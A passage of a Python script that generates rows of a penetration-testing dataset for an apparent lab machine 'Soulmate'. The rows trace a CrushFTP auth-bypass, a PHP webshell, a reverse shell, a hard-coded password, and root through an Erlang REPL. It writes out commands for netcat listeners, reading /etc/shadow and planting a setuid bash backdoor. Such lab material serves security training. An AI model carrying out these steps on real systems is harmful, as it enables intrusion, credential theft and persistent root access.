3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [completed]
5.1. Enumerate CrushFTP file system access [completed]: {Findings: File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.}
5.2. Establish reverse shell [completed]: {Findings: Reverse shell established as www-data user.}
6. Privilege Escalation Enumeration [completed]
6.1. Search for credentials and sensitive files [completed]: {Findings: Erlang SSH script at /usr/local/lib/erlang_login/start.escript contains hard-coded password for user ben: HouseH0ldings998}
7. Lateral Movement [to-do]
7.1. Access ben user account [to-do]"""

    row_9 = create_csv_row(
        machine=machine,
        ptt=ptt_9,
        previous_strategy="Enumerate system for privilege escalation vectors",
        previous_step="The www-data shell was used to search home directories, configuration files, SUID binaries, and scheduled tasks for anything that could enable lateral movement or escalation.",
        previous_step_result="Erlang SSH script at /usr/local/lib/erlang_login/start.escript contains hard-coded password for user ben: HouseH0ldings998",
        new_strategy="Pivot to ben user account using discovered credentials",
        strategy_explanation="Discovered hard-coded password for user ben in Erlang SSH script. This credential should allow switching to ben user via su command or SSH, providing access to a privileged user account.",
        action=(
            "1. From the current www-data shell session, attempt to switch to user ben using the discovered password via: su - ben with password HouseH0ldings998.\n"
            "2. If su is unavailable or restricted, attempt SSH login as ben using the discovered credentials: ssh ben@localhost or ssh ben@soulmate.htb.\n"
            "3. Verify successful authentication by checking the user context (whoami, id) and confirming access to ben's home directory.\n"
            "4. Retrieve the user flag from ben's home directory (cat ~/user.txt or ls ~/flag*).\n"
            "5. Enumerate ben's permissions, group memberships, and accessible resources to prepare for further privilege escalation toward root."
        ),
        mcp_servers=["Interactive CLI", "Netcat"],
        mcp_server_usage=(
            "Interactive CLI:\n"
            "* Execute the user pivot from www-data to ben within the existing reverse shell session using su or SSH.\n"
            "* Run su - ben and enter HouseH0ldings998 when prompted, or execute: ssh ben@localhost with the discovered password.\n"
            "* Expect: successful authentication as user ben, access to ben's home directory, and retrieval of the user flag.\n\n"
            "Netcat:\n"
            "* If the current shell session is unstable for interactive su commands, establish a fresh reverse shell or bind shell session as ben after successful authentication.\n"
            "* Set up a new listener (nc -lvnp 5555) and trigger a new reverse shell from the ben account to get a stable session.\n"
            "* Expect: a clean, stable shell session running as user ben suitable for further enumeration and privilege escalation."
        ),
        results=(
            "Reconnaissance identified SSH and HTTP with a vhost soulmate.htb and a CrushFTP instance on ftp.soulmate.htb (CrushFTP v11). The CrushFTP auth-bypass was exploited to create an "
            "admin-equivalent user and upload a PHP webshell, yielding a www-data reverse shell. Enumeration uncovered /usr/local/lib/erlang_login/start.escript containing hard-coded credentials "
            "for user ben (HouseH0ldings998). Lateral movement to ben and subsequent pivoting to the local Erlang SSH daemon remain to-do."
        ),
    )
    rows.append(row_9)

    # Row 10: Ben user access, enumerate for root
    ptt_10 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [completed]
5.1. Enumerate CrushFTP file system access [completed]: {Findings: File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.}
5.2. Establish reverse shell [completed]: {Findings: Reverse shell established as www-data user.}
6. Privilege Escalation Enumeration [completed]
6.1. Search for credentials and sensitive files [completed]: {Findings: Erlang SSH script at /usr/local/lib/erlang_login/start.escript contains hard-coded password for user ben: HouseH0ldings998}
7. Lateral Movement [completed]
7.1. Access ben user account [completed]: {Findings: Successfully switched to user ben. User flag captured.}
8. Root Privilege Escalation [to-do]
8.1. Enumerate ben user privileges [to-do]"""

    row_10 = create_csv_row(
        machine=machine,
        ptt=ptt_10,
        previous_strategy="Pivot to ben user account using discovered credentials",
        previous_step="The discovered password was used to switch into the ben account, and access to ben's home directory was confirmed along with the user flag.",
        previous_step_result="Successfully switched to user ben. User flag captured.",
        new_strategy="Enumerate ben user environment for root privilege escalation",
        strategy_explanation="Have ben user access. The Erlang SSH script that contained ben's password suggests Erlang is involved in system authentication. Need to investigate the Erlang SSH daemon and its privileges.",
        action=(
            "1. Identify the Erlang SSH daemon process running on the system and determine what port it listens on (netstat -tlnp or ss -tlnp) and what user runs it (ps aux | grep erl).\n"
            "2. Examine Erlang daemon configuration files and start scripts (e.g., /usr/local/lib/erlang_login/start.escript) to understand authentication method and connection parameters.\n"
            "3. Attempt to connect to the Erlang SSH daemon using SSH client with the credentials available for ben or any credentials found in the Erlang scripts.\n"
            "4. Once connected, test the Erlang REPL environment by executing basic Erlang expressions to confirm interactive code execution capability.\n"
            "5. Determine what system-level access the Erlang REPL provides by testing os:cmd() for shell command execution and file:read_file() for file access, and verify these run as root."
        ),
        mcp_servers=["Interactive CLI", "File System Analysis", "Nmap"],
        mcp_server_usage=(
            "Interactive CLI:\n"
            "* Connect to the Erlang SSH daemon and interact with its REPL from ben's shell session.\n"
            "* Run: ssh -p <erlang-port> ben@localhost (or the appropriate user/port), then test with Erlang expressions like os:cmd(\"id\"). to check privilege level.\n"
            "* Expect: an Erlang REPL prompt providing code execution; os:cmd() output should reveal root-level command execution.\n\n"
            "File System Analysis:\n"
            "* Enumerate Erlang-related files and configurations accessible to user ben to gather connection parameters, authentication credentials, and daemon behavior.\n"
            "* Search /usr/local/lib/erlang_login/, /etc/erlang/, ~/.erlang.cookie, and any Erlang application directories for configuration and credential data.\n"
            "* Expect: discovery of the Erlang daemon port, authentication mechanism, cookie value, and any scripts revealing how to interact with the REPL.\n\n"
            "Nmap:\n"
            "* Scan localhost or internal interfaces to identify the port the Erlang SSH daemon is listening on, in case it is not visible from an external scan.\n"
            "* Run: nmap -sV -p- 127.0.0.1 to enumerate locally bound services not exposed externally.\n"
            "* Expect: identification of the Erlang SSH daemon port and version information confirming it is a viable connection target."
        ),
        results=(
            "The tester progressed through reconnaissance, discovered ftp.soulmate.htb hosting CrushFTP v11, and exploited CVE-2025-31161 to create an admin-equivalent user (0xben). They granted "
            "full file access, uploaded a PHP webshell, gained a www-data reverse shell, discovered hardcoded ben credentials in /usr/local/lib/erlang_login/start.escript, and used those credentials "
            "to SSH in as ben and capture the user flag. Local Erlang SSH daemon discovery and root escalation via the Erlang REPL remain to-do."
        ),
    )
    rows.append(row_10)

    # Row 11: Erlang discovery and exploitation
    ptt_11 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: Three open ports discovered on target 10.129.242.171: Port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [completed]
5.1. Enumerate CrushFTP file system access [completed]: {Findings: File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.}
5.2. Establish reverse shell [completed]: {Findings: Reverse shell established as www-data user.}
6. Privilege Escalation Enumeration [completed]
6.1. Search for credentials and sensitive files [completed]: {Findings: Erlang SSH script at /usr/local/lib/erlang_login/start.escript contains hard-coded password for user ben: HouseH0ldings998}
7. Lateral Movement [completed]
7.1. Access ben user account [completed]: {Findings: Successfully switched to user ben. User flag captured.}
8. Root Privilege Escalation [completed]
8.1. Enumerate ben user privileges [completed]: {Findings: Erlang SSH daemon runs as root. Provides full Erlang REPL with root-level code execution. Erlang functions file:read_file() and os:cmd() allow reading root files and executing root commands.}
8.2. Exploit Erlang REPL for root access [to-do]"""

    row_11 = create_csv_row(
        machine=machine,
        ptt=ptt_11,
        previous_strategy="Enumerate ben user environment for root privilege escalation",
        previous_step="The Erlang SSH daemon was located, its configuration reviewed, and a connection to its REPL was tested, confirming it runs as root and offers arbitrary code execution.",
        previous_step_result="Erlang SSH daemon runs as root. Provides full Erlang REPL with root-level code execution. Erlang functions file:read_file() and os:cmd() allow reading root files and executing root commands.",
        new_strategy="Exploit Erlang REPL running as root to achieve full system compromise",
        strategy_explanation="Discovered Erlang SSH daemon running as root with REPL access. Can use Erlang's built-in functions like file:read_file() to read /root/root.txt and os:cmd() to execute arbitrary commands as root. This provides complete system compromise.",
        action=(
            "1. Connect to the Erlang SSH daemon running as root using ben's credentials and the identified port (ssh -p <port> ben@localhost).\n"
            "2. At the Erlang REPL prompt, use file:read_file('/root/root.txt') to directly read the root flag and confirm root-level file access.\n"
            "3. Use os:cmd(\"id\") and os:cmd(\"whoami\") to verify command execution is running as the root user.\n"
            "4. Create a persistent SetUID bash binary for a stable root shell: os:cmd(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\") then execute /tmp/rootbash -p from a separate shell to gain persistent root access.\n"
            "5. Enumerate /root directory contents and any additional sensitive files (os:cmd(\"ls -la /root\"), os:cmd(\"cat /etc/shadow\")) to complete the post-exploitation data gathering."
        ),
        mcp_servers=["Interactive CLI", "File System Analysis"],
        mcp_server_usage=(
            "Interactive CLI:\n"
            "* Connect to the Erlang SSH daemon and execute root-level commands through the Erlang REPL interface.\n"
            "* Run ssh session to the Erlang daemon, then issue: file:read_file(\"/root/root.txt\"). and os:cmd(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\"). at the Erlang prompt.\n"
            "* Expect: successful retrieval of the root flag and creation of a SetUID bash binary providing persistent root-level shell access.\n\n"
            "File System Analysis:\n"
            "* After establishing root code execution via Erlang REPL, comprehensively enumerate the root-accessible file system for post-exploitation artifacts.\n"
            "* Use os:cmd() calls within the Erlang REPL to enumerate /root, /etc/shadow, /home directories, and other sensitive paths not accessible to ben.\n"
            "* Expect: root flag contents, password hashes from /etc/shadow, SSH keys, and any other sensitive data stored in root-owned locations."
        ),
        results=(
            "The Erlang SSH daemon was confirmed running as root and exposes an interactive Erlang REPL. Using file:read_file() and os:cmd() from the REPL, the tester read /root/root.txt (root flag), "
            "verified root command execution, created a persistent setuid root bash at /tmp/rootbash, and enumerated sensitive files including /etc/shadow. Root-level access and persistent root "
            "shell capability were achieved at this checkpoint."
        ),
    )
    rows.append(row_11)

    # Row 12: Root achieved, end
    ptt_12 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [completed]
5.1. Enumerate CrushFTP file system access [completed]: {Findings: File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.}
5.2. Establish reverse shell [completed]: {Findings: Reverse shell established as www-data user.}
6. Privilege Escalation Enumeration [completed]
6.1. Search for credentials and sensitive files [completed]: {Findings: Erlang SSH script at /usr/local/lib/erlang_login/start.escript contains hard-coded password for user ben: HouseH0ldings998}
7. Lateral Movement [completed]
7.1. Access ben user account [completed]: {Findings: Successfully switched to user ben. User flag captured.}
8. Root Privilege Escalation [completed]
8.1. Enumerate ben user privileges [completed]: {Findings: Erlang SSH daemon runs as root. Provides full Erlang REPL with root-level code execution. Erlang functions file:read_file() and os:cmd() allow reading root files and executing root commands.}
8.2. Exploit Erlang REPL for root access [completed]: {Findings: Root flag captured via Erlang file:read_file(). SetUID bash created for persistent root shell. Complete system compromise achieved.}"""

    row_12 = create_csv_row(
        machine=machine,
        ptt=ptt_12,
        previous_strategy="Exploit Erlang REPL running as root to achieve full system compromise",
        previous_step="Root-level command execution was confirmed through the Erlang REPL, the root flag was read directly, and a persistent SetUID root shell was created for stable access.",
        previous_step_result="Root flag captured via Erlang file:read_file(). SetUID bash created for persistent root shell. Complete system compromise achieved.",
        new_strategy="Complete penetration test and prepare final report",
        strategy_explanation="Successfully completed full attack chain: CrushFTP authentication bypass, webshell upload for initial access, hard-coded credential discovery for lateral movement, and Erlang REPL exploitation for root access. All objectives achieved.",
        action=(
            "1. Compile the complete attack chain documentation: initial access via CrushFTP CVE exploitation, admin credential creation, webshell upload through VFS mount, reverse shell as www-data, "
            "credential discovery in Erlang script, pivot to ben, Erlang REPL root exploitation.\n"
            "2. Document all discovered vulnerabilities with CVE references, CVSS scores where applicable, and evidence screenshots or command outputs for each finding.\n"
            "3. Capture proof of compromise artifacts: user flag (user.txt), root flag (root.txt), /etc/passwd and /etc/shadow contents, and any other sensitive data obtained.\n"
            "4. Formulate remediation recommendations for each identified vulnerability: patch CrushFTP, disable anonymous VFS mounts, remove hardcoded credentials from Erlang scripts, restrict "
            "Erlang SSH daemon access.\n"
            "5. Structure the final report with executive summary, technical findings, exploitation timeline, impact assessment, and prioritized remediation roadmap."
        ),
        mcp_servers=["Google Search", "ExploitDB"],
        mcp_server_usage=(
            "Google Search:\n"
            "* Research official CVE details, CVSS scores, and vendor advisories for the CrushFTP vulnerability exploited during the engagement.\n"
            "* Look up best-practice remediation guidance for the identified vulnerabilities including CrushFTP patching, NFS security, and Erlang daemon hardening.\n"
            "* Expect: CVE identifiers, official vendor patch references, CVSS severity scores, and industry-standard remediation recommendations to include in the final report.\n\n"
            "ExploitDB:\n"
            "* Retrieve the formal exploit details for the CrushFTP vulnerability used to gain initial access, including exploit title, CVE, and technical description.\n"
            "* Search for any additional public exploits related to discovered services to ensure complete vulnerability coverage in the report.\n"
            "* Expect: exploit IDs, technical descriptions, and PoC code references that can be cited as evidence in the penetration test report findings."
        ),
        results=(
            "Exploitation chain completed: CrushFTP CVE-2025-31161 was exploited to create an admin user and obtain write access to a web VFS, enabling a PHP webshell and a www-data reverse shell. "
            "Hard-coded credentials in /usr/local/lib/erlang_login/start.escript allowed SSH to ben; from ben the local Erlang SSH on 127.0.0.1:2222 provided an Erlang REPL that was used to read "
            "the root flag and execute root commands, and a setuid-root bash was created for persistence. Full root compromise and capture of both user and root flags confirmed."
        ),
    )
    rows.append(row_12)

    return rows

if __name__ == "__main__":
    print("Generating Soulmate machine dataset...")
    rows = generate_soulmate_rows()
    filename = os.path.join(os.path.dirname(__file__), "..", "output", "pentest_dataset_batch1_machines_1-10.csv")
    append_rows_to_csv(filename, rows)
    print(f"Generated {len(rows)} rows for Soulmate")
